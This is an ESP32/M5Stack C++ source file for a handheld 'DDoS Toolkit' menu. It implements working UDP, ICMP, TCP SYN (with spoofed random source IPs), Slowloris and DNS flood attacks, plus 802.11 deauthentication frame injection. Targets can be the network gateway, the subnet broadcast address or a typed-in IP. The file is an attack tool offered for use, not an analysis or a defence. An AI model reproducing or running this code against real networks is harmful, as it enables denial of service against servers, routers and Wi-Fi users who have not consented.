#include "ddos_menu.h"
#include "config.h"
#include "settings.h"
#include "keyboard.h"
#include "ui.h"
#include "menu.h"
#include <Arduino.h>
#include <M5Unified.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <vector>
#include <lwip/sockets.h>
#include <lwip/netif.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

enum DDOS_ATTACK_TYPE {
    ATTACK_UDP = 0,
    ATTACK_ICMP = 1,
    ATTACK_DEAUTH = 2,
    ATTACK_SYN_FLOOD = 3,
    ATTACK_SLOWLORIS = 4,
    ATTACK_DNS_FLOOD = 5
};

static IPAddress         s_targetIP       = IPAddress(0,0,0,0);
static int               s_targetPort     = 80;
static DDOS_ATTACK_TYPE  s_attackType     = ATTACK_UDP;
static volatile bool     s_attackRunning  = false;
static volatile unsigned long s_packetCount = 0;
static uint8_t           s_targetBSSID[6];
static uint8_t           s_deauthChannel = 1;

#define SLOWLORIS_MAX_SOCKETS 30
static int                s_slowSockets[SLOWLORIS_MAX_SOCKETS];
static int                s_slowSocketCount = 0;

static int                s_dnsSocket = -1;
static struct sockaddr_in s_dnsAddr;

struct tcp_header {
    uint16_t src_port;
    uint16_t dst_port;
    uint32_t seq_num;
    uint32_t ack_num;
    uint8_t  data_offset;  
    uint8_t  flags;
    uint16_t window;
    uint16_t checksum;
    uint16_t urg_ptr;
} __attribute__((packed));

struct FloodContext {
    int               sock_fd;
    struct sockaddr_in target_addr;
    uint8_t           payload[1472];
    size_t            payload_len;
};

static uint16_t icmp_checksum(const void *data, size_t len) {
    uint32_t sum = 0;
    const uint16_t *ptr = (const uint16_t *)data;
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len == 1) sum += *(const uint8_t *)ptr;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

static void buildDeauthPacket(uint8_t *packet, const uint8_t *bssid) {
    packet[0] = 0xC0; packet[1] = 0x00;
    packet[2] = 0x00; packet[3] = 0x00;
    memset(&packet[4], 0xFF, 6);
    memcpy(&packet[10], bssid, 6);
    memcpy(&packet[16], bssid, 6);
    packet[22] = 0x00; packet[23] = 0x00;
    packet[24] = 0x07; packet[25] = 0x00;
}

static void deauthTask(void *pvParameters) {
    bool *running = (bool *)pvParameters;
    uint8_t packet[26];
    buildDeauthPacket(packet, s_targetBSSID);
    while (*running) {
        esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
        s_packetCount++;
        vTaskDelay(pdMS_TO_TICKS(1));
    }
    vTaskDelete(NULL);
}

static void floodTask(void *pvParameters) {
    FloodContext *ctx = (FloodContext *)pvParameters;
    int flags = lwip_fcntl(ctx->sock_fd, F_GETFL, 0);
    if (flags >= 0) lwip_fcntl(ctx->sock_fd, F_SETFL, flags | O_NONBLOCK);

    while (s_attackRunning) {
        int ret = lwip_sendto(ctx->sock_fd,
                              ctx->payload,
                              ctx->payload_len,
                              0,
                              (struct sockaddr *)&ctx->target_addr,
                              sizeof(ctx->target_addr));
        if (ret < 0) {
            vTaskDelay(pdMS_TO_TICKS(5));   
        } else {
            s_packetCount++;
            vTaskDelay(pdMS_TO_TICKS(1));
        }
    }
    lwip_close(ctx->sock_fd);
    ctx->sock_fd = -1;
    vTaskDelete(NULL);
}

static void synFloodTask(void *pvParameters) {
    int sock = lwip_socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        vTaskDelete(NULL);
        return;
    }

    int flags = lwip_fcntl(sock, F_GETFL, 0);
    if (flags >= 0) lwip_fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    while (s_attackRunning) {
        
        uint8_t packet[40]; 

        
        memset(packet, 0, 40);
        packet[0] = 0x45;                     
        packet[1] = 0;                        
        uint16_t total_len = htons(40);
        memcpy(packet + 2, &total_len, 2);
        uint16_t ip_id = htons(esp_random() & 0xFFFF);
        memcpy(packet + 4, &ip_id, 2);
        packet[6] = 0; packet[7] = 0;         
        packet[8] = 64;                       
        packet[9] = IPPROTO_TCP;              
        
        uint32_t src_ip;
        if (esp_random() % 2) {
            src_ip = (esp_random() % 0xFFFFFF) | 0x0A000000; 
        } else {
            src_ip = esp_random(); 
        }
        memcpy(packet + 12, &src_ip, 4);
        
        uint32_t dst_ip = (uint32_t)s_targetIP;
        memcpy(packet + 16, &dst_ip, 4);
        
        uint16_t ip_cksum = icmp_checksum(packet, 20);
        memcpy(packet + 10, &ip_cksum, 2);

        
        uint16_t src_port = htons(1024 + (esp_random() % 64512));
        memcpy(packet + 20, &src_port, 2);
        uint16_t dst_port = htons(s_targetPort);
        memcpy(packet + 22, &dst_port, 2);
        uint32_t seq = esp_random();
        memcpy(packet + 24, &seq, 4);
        memset(packet + 28, 0, 4);            
        packet[32] = 0x50;                    
        packet[33] = 0x02;                    
        uint16_t win = htons(65535);
        memcpy(packet + 34, &win, 2);
        memset(packet + 36, 0, 2);            
        memset(packet + 38, 0, 2);            

        
        
        
        struct {
            uint32_t src;
            uint32_t dst;
            uint8_t  zero;
            uint8_t  proto;
            uint16_t tcp_len;
        } pseudo = { src_ip, dst_ip, 0, IPPROTO_TCP, htons(20) };
        uint8_t cksum_buf[sizeof(pseudo) + 20];
        memcpy(cksum_buf, &pseudo, sizeof(pseudo));
        memcpy(cksum_buf + sizeof(pseudo), packet + 20, 20);
        uint16_t tcp_cksum = icmp_checksum(cksum_buf, sizeof(cksum_buf));
        memcpy(packet + 36, &tcp_cksum, 2);

        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = dst_ip;

        int ret = lwip_sendto(sock, packet, sizeof(packet), 0,
                              (struct sockaddr *)&dest, sizeof(dest));
        if (ret < 0) {
            vTaskDelay(pdMS_TO_TICKS(5));
        } else {
            s_packetCount++;
            vTaskDelay(pdMS_TO_TICKS(1));
        }
    }
    lwip_close(sock);
    vTaskDelete(NULL);
}

static void slowlorisTask(void *pvParameters) {
    
    for (int i = 0; i < SLOWLORIS_MAX_SOCKETS; i++) {
        if (s_slowSockets[i] >= 0) {
            lwip_close(s_slowSockets[i]);
            s_slowSockets[i] = -1;
        }
    }
    s_slowSocketCount = 0;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = (uint32_t)s_targetIP;
    addr.sin_port = htons(s_targetPort);

    
    for (int i = 0; i < SLOWLORIS_MAX_SOCKETS && s_attackRunning; i++) {
        int fd = lwip_socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) break;
        int ret = lwip_connect(fd, (struct sockaddr*)&addr, sizeof(addr));
        if (ret < 0) {
            lwip_close(fd);
            vTaskDelay(pdMS_TO_TICKS(200));
            i--; 
            continue;
        }
        const char* req = "GET / HTTP/1.1\r\nHost: ";
        lwip_send(fd, req, strlen(req), 0);
        char hostbuf[64];
        snprintf(hostbuf, sizeof(hostbuf), "%s\r\n", s_targetIP.toString().c_str());
        lwip_send(fd, hostbuf, strlen(hostbuf), 0);
        s_slowSockets[i] = fd;
        s_slowSocketCount++;
    }

    const char* keepAlive = "X-Slowloris: keepalive\r\n";
    while (s_attackRunning) {
        for (int i = 0; i < s_slowSocketCount; i++) {
            int fd = s_slowSockets[i];
            if (fd < 0) continue;
            int ret = lwip_send(fd, keepAlive, strlen(keepAlive), 0);
            if (ret < 0) {
                lwip_close(fd);
                fd = lwip_socket(AF_INET, SOCK_STREAM, 0);
                if (fd >= 0) {
                    if (lwip_connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                        const char* req = "GET / HTTP/1.1\r\nHost: ";
                        lwip_send(fd, req, strlen(req), 0);
                        char hostbuf[64];
                        snprintf(hostbuf, sizeof(hostbuf), "%s\r\n", s_targetIP.toString().c_str());
                        lwip_send(fd, hostbuf, strlen(hostbuf), 0);
                        s_slowSockets[i] = fd;
                    } else {
                        lwip_close(fd);
                        s_slowSockets[i] = -1;
                    }
                }
            }
            s_packetCount++;
        }
        vTaskDelay(pdMS_TO_TICKS(2000));
    }

    for (int i = 0; i < SLOWLORIS_MAX_SOCKETS; i++) {
        if (s_slowSockets[i] >= 0) {
            lwip_close(s_slowSockets[i]);
            s_slowSockets[i] = -1;
        }
    }
    vTaskDelete(NULL);
}

static void dnsFloodTask(void *pvParameters) {
    uint8_t dnsQuery[32];
    while (s_attackRunning) {
        memset(dnsQuery, 0, sizeof(dnsQuery));
        uint16_t id = esp_random() & 0xFFFF;
        dnsQuery[0] = (id >> 8) & 0xFF;
        dnsQuery[1] = id & 0xFF;
        dnsQuery[2] = 0x01;
        dnsQuery[3] = 0x00;
        dnsQuery[4] = 0x00; dnsQuery[5] = 0x01;
        int len = 3 + (esp_random() % 8);
        int pos = 12;
        for (int i = 0; i < len; i++) dnsQuery[pos++] = 'a' + (esp_random() % 26);
        dnsQuery[pos++] = 0x03; dnsQuery[pos++] = 'c'; dnsQuery[pos++] = 'o'; dnsQuery[pos++] = 'm';
        dnsQuery[pos++] = 0x00;
        dnsQuery[pos++] = 0x00; dnsQuery[pos++] = 0x01;
        dnsQuery[pos++] = 0x00; dnsQuery[pos++] = 0x01;

        int ret = lwip_sendto(s_dnsSocket, dnsQuery, pos, 0,
                              (struct sockaddr *)&s_dnsAddr, sizeof(s_dnsAddr));
        if (ret < 0) vTaskDelay(pdMS_TO_TICKS(5));
        else { s_packetCount++; vTaskDelay(pdMS_TO_TICKS(1)); }
    }
    if (s_dnsSocket >= 0) {
        lwip_close(s_dnsSocket);
        s_dnsSocket = -1;
    }
    vTaskDelete(NULL);
}

static void startIPFlood(bool isUDP) {
    if (s_targetIP == IPAddress(0,0,0,0)) {
        displayWarning("Target IP not set", true);
        return;
    }
    if (WiFi.status() != WL_CONNECTED) {
        displayError("WiFi not connected", true);
        return;
    }

    int proto = isUDP ? IPPROTO_UDP : IPPROTO_ICMP;
    int sock_type = isUDP ? SOCK_DGRAM : SOCK_RAW;
    int fd = lwip_socket(AF_INET, sock_type, proto);
    if (fd < 0) { displayError("socket() failed", true); return; }

    static FloodContext ctx;
    if (isUDP) {
        ctx.payload_len = 1472;
        for (size_t i = 0; i < ctx.payload_len; i++) ctx.payload[i] = (uint8_t)random(256);
    } else {
        ctx.payload_len = 64;
        memset(ctx.payload, 0, ctx.payload_len);
        ctx.payload[0] = 8;
        ctx.payload[1] = 0;
        uint16_t cs = icmp_checksum(ctx.payload, ctx.payload_len);
        ctx.payload[2] = cs & 0xFF;
        ctx.payload[3] = (cs >> 8) & 0xFF;
    }
    ctx.sock_fd = fd;
    memset(&ctx.target_addr, 0, sizeof(ctx.target_addr));
    ctx.target_addr.sin_family = AF_INET;
    ctx.target_addr.sin_port = htons(s_targetPort);
    ctx.target_addr.sin_addr.s_addr = (uint32_t)s_targetIP;

    s_attackRunning = true;
    s_packetCount = 0;

    TaskHandle_t handle;
    xTaskCreatePinnedToCore(floodTask, "floodTask", 4096, &ctx,
                            tskIDLE_PRIORITY + 2, &handle, 1);

    unsigned long start_ms = millis();
    unsigned long last_stat = start_ms;
    while (s_attackRunning) {
        M5.update(); pollKeyboard();
        if (check(EscPress)) {
            s_attackRunning = false; uiBeep(440, 30); waitAllKeysReleased(); break;
        }
        if (millis() - last_stat >= 500) {
            last_stat = millis();
            unsigned long elapsed = millis() - start_ms;
            unsigned long pkts = s_packetCount;

            M5.Display.fillScreen(kitenConfig.bgColor);
            drawMainBorder(false);
            M5.Display.setTextSize(FM);
            M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y);
            M5.Display.print(isUDP ? "UDP FLOOD" : "ICMP FLOOD");
            M5.Display.drawFastHLine(BORDER_PAD_X, BORDER_PAD_Y + LH*FM + 2,
                                     SCREEN_WIDTH - 2*BORDER_PAD_X, kitenConfig.secColor);
            int y = BORDER_PAD_Y + LH*FM + 8;
            M5.Display.setTextSize(FP);
            M5.Display.setTextColor(TFT_WHITE, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("Target: " + s_targetIP.toString() + ":" + String(s_targetPort));
            y += LH+2; M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("Elapsed: " + String(elapsed / 1000) + "s");
            y += LH+2;
            float rate = (elapsed > 0) ? (pkts * 1000.0f / elapsed) : 0;
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("Packets: " + String(pkts) + " (" + String(rate, 0) + " pps)");
            y += LH+4; M5.Display.setTextColor(TFT_RED, kitenConfig.bgColor); M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("[ESC] Stop");
        }
        markActivity(); delay(5);
    }

    while (eTaskGetState(handle) != eDeleted && millis() - start_ms < 3000) delay(10);
    if (eTaskGetState(handle) != eDeleted) vTaskDelete(handle);

    unsigned long total_ms = millis() - start_ms;
    unsigned long final_pkts = s_packetCount;
    float avg = (total_ms > 0) ? (final_pkts * 1000.0f / total_ms) : 0;
    displayInfo("Flood finished.\nPackets: " + String(final_pkts) + "\nTime: " + String(total_ms/1000) + "s\nAvg: " + String(avg,0) + " pps", true);
}

static void startDeauthFlood() {
    if (WiFi.status() == WL_CONNECTED) {
        memcpy(s_targetBSSID, WiFi.BSSID(), 6);
        s_deauthChannel = WiFi.channel();
    }
    bool validBSSID = false;
    for (int i = 0; i < 6; i++) if (s_targetBSSID[i] != 0) { validBSSID = true; break; }
    if (!validBSSID) { displayError("No AP MAC. Connect to WiFi first.", true); return; }

    String ssid = WiFi.SSID();
    String pass = WiFi.psk();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    if (esp_wifi_set_channel(s_deauthChannel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
        displayError("Failed to set channel", true);
        WiFi.begin(ssid.c_str(), pass.c_str());
        return;
    }
    delay(50);

    s_attackRunning = true; s_packetCount = 0;
    bool *running_ptr = (bool *)&s_attackRunning;
    TaskHandle_t deauthHandle;
    xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, running_ptr, tskIDLE_PRIORITY + 2, &deauthHandle, 1);

    unsigned long start_ms = millis();
    unsigned long last_stat = start_ms;
    while (s_attackRunning) {
        M5.update(); pollKeyboard();
        if (check(EscPress)) { s_attackRunning = false; uiBeep(440,30); waitAllKeysReleased(); break; }
        if (millis() - last_stat >= 500) {
            last_stat = millis(); unsigned long elapsed = millis() - start_ms; unsigned long pkts = s_packetCount;
            M5.Display.fillScreen(kitenConfig.bgColor); drawMainBorder(false);
            M5.Display.setTextSize(FM); M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y); M5.Display.print("DEAUTH FLOOD");
            M5.Display.drawFastHLine(BORDER_PAD_X, BORDER_PAD_Y + LH*FM + 2, SCREEN_WIDTH - 2*BORDER_PAD_X, kitenConfig.secColor);
            int y = BORDER_PAD_Y + LH*FM + 8;
            M5.Display.setTextSize(FP); M5.Display.setTextColor(TFT_WHITE, kitenConfig.bgColor);
            char mac[18]; snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X", s_targetBSSID[0],s_targetBSSID[1],s_targetBSSID[2],s_targetBSSID[3],s_targetBSSID[4],s_targetBSSID[5]);
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("AP MAC: " + String(mac)); y += LH+2;
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("Channel: " + String(s_deauthChannel)); y += LH+2;
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("Elapsed: " + String(elapsed/1000) + "s"); y += LH+2;
            float rate = (elapsed > 0) ? (pkts * 1000.0f / elapsed) : 0;
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("Frames: " + String(pkts) + " (" + String(rate,0) + " fps)");
            y += LH+4; M5.Display.setTextColor(TFT_RED, kitenConfig.bgColor); M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("[ESC] Stop");
        }
        markActivity(); delay(5);
    }
    while (eTaskGetState(deauthHandle) != eDeleted && millis() - start_ms < 3000) delay(10);
    if (eTaskGetState(deauthHandle) != eDeleted) vTaskDelete(deauthHandle);
    if (ssid.length() > 0) WiFi.begin(ssid.c_str(), pass.c_str());
    unsigned long total_ms = millis() - start_ms; unsigned long final_pkts = s_packetCount;
    float avg = (total_ms > 0) ? (final_pkts * 1000.0f / total_ms) : 0;
    displayInfo("Deauth finished.\nFrames: " + String(final_pkts) + "\nTime: " + String(total_ms/1000) + "s\nAvg: " + String(avg,0) + " fps", true);
}

static void startSYNFlood() {
    if (s_targetIP == IPAddress(0,0,0,0)) { displayWarning("Target IP not set", true); return; }
    if (WiFi.status() != WL_CONNECTED) { displayError("WiFi not connected", true); return; }

    s_attackRunning = true; s_packetCount = 0;
    TaskHandle_t handle;
    xTaskCreatePinnedToCore(synFloodTask, "synFlood", 4096, nullptr, tskIDLE_PRIORITY + 2, &handle, 1);

    unsigned long start_ms = millis();
    unsigned long last_stat = start_ms;
    while (s_attackRunning) {
        M5.update(); pollKeyboard();
        if (check(EscPress)) { s_attackRunning = false; uiBeep(440,30); waitAllKeysReleased(); break; }
        if (millis() - last_stat >= 500) {
            last_stat = millis(); unsigned long elapsed = millis() - start_ms; unsigned long pkts = s_packetCount;
            M5.Display.fillScreen(kitenConfig.bgColor); drawMainBorder(false);
            M5.Display.setTextSize(FM); M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y); M5.Display.print("TCP SYN FLOOD");
            M5.Display.drawFastHLine(BORDER_PAD_X, BORDER_PAD_Y + LH*FM + 2, SCREEN_WIDTH - 2*BORDER_PAD_X, kitenConfig.secColor);
            int y = BORDER_PAD_Y + LH*FM + 8;
            M5.Display.setTextSize(FP); M5.Display.setTextColor(TFT_WHITE, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("Target: " + s_targetIP.toString() + ":" + String(s_targetPort)); y += LH+2;
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("Elapsed: " + String(elapsed/1000) + "s"); y += LH+2;
            float rate = (elapsed > 0) ? (pkts * 1000.0f / elapsed) : 0;
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("SYN packets: " + String(pkts) + " (" + String(rate,0) + " pps)");
            y += LH+4; M5.Display.setTextColor(TFT_RED, kitenConfig.bgColor); M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("[ESC] Stop");
        }
        markActivity(); delay(5);
    }
    while (eTaskGetState(handle) != eDeleted && millis() - start_ms < 3000) delay(10);
    if (eTaskGetState(handle) != eDeleted) vTaskDelete(handle);
    unsigned long total_ms = millis() - start_ms; unsigned long final_pkts = s_packetCount;
    float avg = (total_ms > 0) ? (final_pkts * 1000.0f / total_ms) : 0;
    displayInfo("SYN flood finished.\nSYNs: " + String(final_pkts) + "\nTime: " + String(total_ms/1000) + "s\nAvg: " + String(avg,0) + " pps", true);
}

static void startSlowloris() {
    if (s_targetIP == IPAddress(0,0,0,0)) { displayWarning("Target web server IP not set", true); return; }
    if (WiFi.status() != WL_CONNECTED) { displayError("WiFi not connected", true); return; }
    s_attackRunning = true; s_packetCount = 0;
    TaskHandle_t handle;
    xTaskCreatePinnedToCore(slowlorisTask, "slowloris", 5120, nullptr, tskIDLE_PRIORITY + 2, &handle, 1);
    unsigned long start_ms = millis();
    unsigned long last_stat = start_ms;
    while (s_attackRunning) {
        M5.update(); pollKeyboard();
        if (check(EscPress)) { s_attackRunning = false; uiBeep(440,30); waitAllKeysReleased(); break; }
        if (millis() - last_stat >= 500) {
            last_stat = millis(); unsigned long elapsed = millis() - start_ms; unsigned long pkts = s_packetCount;
            M5.Display.fillScreen(kitenConfig.bgColor); drawMainBorder(false);
            M5.Display.setTextSize(FM); M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y); M5.Display.print("SLOWLORIS");
            M5.Display.drawFastHLine(BORDER_PAD_X, BORDER_PAD_Y + LH*FM + 2, SCREEN_WIDTH - 2*BORDER_PAD_X, kitenConfig.secColor);
            int y = BORDER_PAD_Y + LH*FM + 8;
            M5.Display.setTextSize(FP); M5.Display.setTextColor(TFT_WHITE, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("Target: " + s_targetIP.toString() + ":" + String(s_targetPort)); y += LH+2;
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("Sockets: " + String(s_slowSocketCount) + "/" + String(SLOWLORIS_MAX_SOCKETS)); y += LH+2;
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("Elapsed: " + String(elapsed/1000) + "s"); y += LH+2;
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("Keep-Alives: " + String(pkts));
            y += LH+4; M5.Display.setTextColor(TFT_RED, kitenConfig.bgColor); M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("[ESC] Stop");
        }
        markActivity(); delay(5);
    }
    while (eTaskGetState(handle) != eDeleted && millis() - start_ms < 3000) delay(10);
    if (eTaskGetState(handle) != eDeleted) vTaskDelete(handle);
    unsigned long total_ms = millis() - start_ms; unsigned long final_pkts = s_packetCount;
    displayInfo("Slowloris finished.\nKeep-Alives: " + String(final_pkts) + "\nTime: " + String(total_ms/1000) + "s\nSockets: " + String(s_slowSocketCount), true);
}

static void startDNSFlood() {
    if (s_targetIP == IPAddress(0,0,0,0)) { displayWarning("Target DNS server IP not set", true); return; }
    if (WiFi.status() != WL_CONNECTED) { displayError("WiFi not connected", true); return; }
    s_dnsSocket = lwip_socket(AF_INET, SOCK_DGRAM, 0);
    if (s_dnsSocket < 0) { displayError("DNS socket() failed", true); return; }
    memset(&s_dnsAddr, 0, sizeof(s_dnsAddr));
    s_dnsAddr.sin_family = AF_INET;
    s_dnsAddr.sin_port = htons(53);
    s_dnsAddr.sin_addr.s_addr = (uint32_t)s_targetIP;

    s_attackRunning = true; s_packetCount = 0;
    TaskHandle_t handle;
    xTaskCreatePinnedToCore(dnsFloodTask, "dnsFlood", 4096, nullptr, tskIDLE_PRIORITY + 2, &handle, 1);
    unsigned long start_ms = millis();
    unsigned long last_stat = start_ms;
    while (s_attackRunning) {
        M5.update(); pollKeyboard();
        if (check(EscPress)) { s_attackRunning = false; uiBeep(440,30); waitAllKeysReleased(); break; }
        if (millis() - last_stat >= 500) {
            last_stat = millis(); unsigned long elapsed = millis() - start_ms; unsigned long pkts = s_packetCount;
            M5.Display.fillScreen(kitenConfig.bgColor); drawMainBorder(false);
            M5.Display.setTextSize(FM); M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y); M5.Display.print("DNS FLOOD");
            M5.Display.drawFastHLine(BORDER_PAD_X, BORDER_PAD_Y + LH*FM + 2, SCREEN_WIDTH - 2*BORDER_PAD_X, kitenConfig.secColor);
            int y = BORDER_PAD_Y + LH*FM + 8;
            M5.Display.setTextSize(FP); M5.Display.setTextColor(TFT_WHITE, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("DNS Server: " + s_targetIP.toString()); y += LH+2;
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("Elapsed: " + String(elapsed/1000) + "s"); y += LH+2;
            float rate = (elapsed > 0) ? (pkts * 1000.0f / elapsed) : 0;
            M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("Queries: " + String(pkts) + " (" + String(rate,0) + " qps)");
            y += LH+4; M5.Display.setTextColor(TFT_RED, kitenConfig.bgColor); M5.Display.setCursor(BORDER_PAD_X, y); M5.Display.print("[ESC] Stop");
        }
        markActivity(); delay(5);
    }
    while (eTaskGetState(handle) != eDeleted && millis() - start_ms < 3000) delay(10);
    if (eTaskGetState(handle) != eDeleted) vTaskDelete(handle);
    unsigned long total_ms = millis() - start_ms; unsigned long final_pkts = s_packetCount;
    float avg = (total_ms > 0) ? (final_pkts * 1000.0f / total_ms) : 0;
    displayInfo("DNS flood finished.\nQueries: " + String(final_pkts) + "\nTime: " + String(total_ms/1000) + "s\nAvg: " + String(avg,0) + " qps", true);
}

static String targetString() {
    if (s_targetIP == IPAddress(0,0,0,0)) return "Not set";
    return s_targetIP.toString();
}
static String attackTypeString() {
    switch (s_attackType) {
        case ATTACK_UDP:       return "UDP Flood";
        case ATTACK_ICMP:      return "ICMP Flood";
        case ATTACK_DEAUTH:    return "Deauth Flood";
        case ATTACK_SYN_FLOOD: return "TCP SYN Flood";
        case ATTACK_SLOWLORIS: return "Slowloris";
        case ATTACK_DNS_FLOOD: return "DNS Flood";
        default:               return "?";
    }
}

static void selectTarget() {
    std::vector<Option> opts;
    opts.push_back({"Gateway (auto)", [](){
        if (WiFi.status() != WL_CONNECTED) { displayError("WiFi not connected", true); return; }
        s_targetIP = WiFi.gatewayIP();
        s_targetPort = random(1, 65536);
        displaySuccess("Target: " + s_targetIP.toString());
    }});
    opts.push_back({"Local subnet (broadcast)", [](){
        if (WiFi.status() != WL_CONNECTED) { displayError("WiFi not connected", true); return; }
        IPAddress ip = WiFi.localIP(), mask = WiFi.subnetMask();
        IPAddress bcast; bcast[0]=ip[0]|~mask[0]; bcast[1]=ip[1]|~mask[1]; bcast[2]=ip[2]|~mask[2]; bcast[3]=ip[3]|~mask[3];
        s_targetIP = bcast; s_targetPort = random(1,65536);
        displaySuccess("Target: " + s_targetIP.toString() + " (broadcast)");
    }});
    opts.push_back({"Enter IP + Port", [](){
        String ipStr = keyboard("",15,"Target IP:"); if (ipStr=="\x1B"||ipStr.length()==0) return;
        IPAddress ip; if (!ip.fromString(ipStr)) { displayError("Invalid IP", true); return; }
        String portStr = keyboard(String(s_targetPort),5,"Port:"); if (portStr=="\x1B") return;
        long p = portStr.toInt(); if (p<1||p>65535) { displayError("Invalid port",true); return; }
        s_targetIP = ip; s_targetPort = (int)p;
        displaySuccess("Target: " + ip.toString() + ":" + String(s_targetPort));
    }});
    addBackItem(opts);
    loopOptions(opts, MENU_TYPE_REGULAR, "Select Target");
}

static void selectAttackType() {
    std::vector<Option> opts;
    opts.push_back({"UDP Flood",     [](){ s_attackType = ATTACK_UDP; }});
    opts.push_back({"ICMP Flood",    [](){ s_attackType = ATTACK_ICMP; }});
    opts.push_back({"Deauth Flood",  [](){ s_attackType = ATTACK_DEAUTH; }});
    opts.push_back({"TCP SYN Flood", [](){ s_attackType = ATTACK_SYN_FLOOD; }});
    opts.push_back({"Slowloris",     [](){ s_attackType = ATTACK_SLOWLORIS; }});
    opts.push_back({"DNS Flood",     [](){ s_attackType = ATTACK_DNS_FLOOD; }});
    addBackItem(opts);
    loopOptions(opts, MENU_TYPE_REGULAR, "Attack Type");
}

void ddosMenuEntry() {
    int sel = 0;
    std::vector<Option> opts;
    for (;;) {
        opts.clear();
        opts.push_back({"Target: " + targetString(),        [](){ selectTarget(); }});
        opts.push_back({"Type: "   + attackTypeString(),    [](){ selectAttackType(); }});
        opts.push_back({"START ATTACK", [](){
            switch (s_attackType) {
                case ATTACK_UDP:       startIPFlood(true); break;
                case ATTACK_ICMP:      startIPFlood(false); break;
                case ATTACK_DEAUTH:    startDeauthFlood(); break;
                case ATTACK_SYN_FLOOD: startSYNFlood(); break;
                case ATTACK_SLOWLORIS: startSlowloris(); break;
                case ATTACK_DNS_FLOOD: startDNSFlood(); break;
            }
        }});
        addBackItem(opts);
        sel = loopOptions(opts, MENU_TYPE_REGULAR, "DDoS Toolkit");
        if (sel == -1 || sel == (int)opts.size() - 1) return;
    }
}